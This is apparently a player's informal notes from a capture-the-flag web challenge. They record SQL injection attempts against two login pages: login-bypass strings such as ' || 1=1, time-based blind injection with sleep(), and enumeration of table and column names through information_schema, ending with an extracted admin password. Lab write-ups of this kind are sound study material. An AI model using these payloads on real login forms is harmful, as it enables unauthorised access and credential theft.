Login2

' OR 1=1 -- test, filters out the OR I think

1' + (SELECT sleep(3) from users) -- test
Table name is users since user did not hang
We did ' || 1=1 -- test 
it worked lol

Login 3

' || 1=1 -- test 
now says disabled guest logins, assume this means I actually have to match to a real login name
' + (SELECT sleep(3) from users) -- test
' + (SELECT sleep(3) from users WHERE ) -- test

First need to enumerate the column names

' + (SELECT IF (SUBSTR(SELECT username FROM users LIMIT 1, 1, 1)='a',sleep(5),1)) -- test

SELECT username, password FROM users WHERE username = " " " and password = " "
' || 1=1 

' + (SELECT IF((SELECT username FROM users LIMIT 1),sleep(5),1)) '

' + (SELECT password FROM users LIMIT 1 OFFSET 1) -- c
' + (SELECT password FROM users LIMIT 1 OFFSET 2) OR 1=1-- c worked so must just be first account disabled?

must be WHERE password = "" and username = ""

' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),1,1)='u' ,sleep(3),1))-- c
this worked and I enumerated the column name as username

Enumerated this part of the table

UID | USERNAME | PASSWORD           |
        GUEST
        ADMIN   RKIGRJMGKLSADXCVVE

The password was in clear text, I used it to login and got the flag
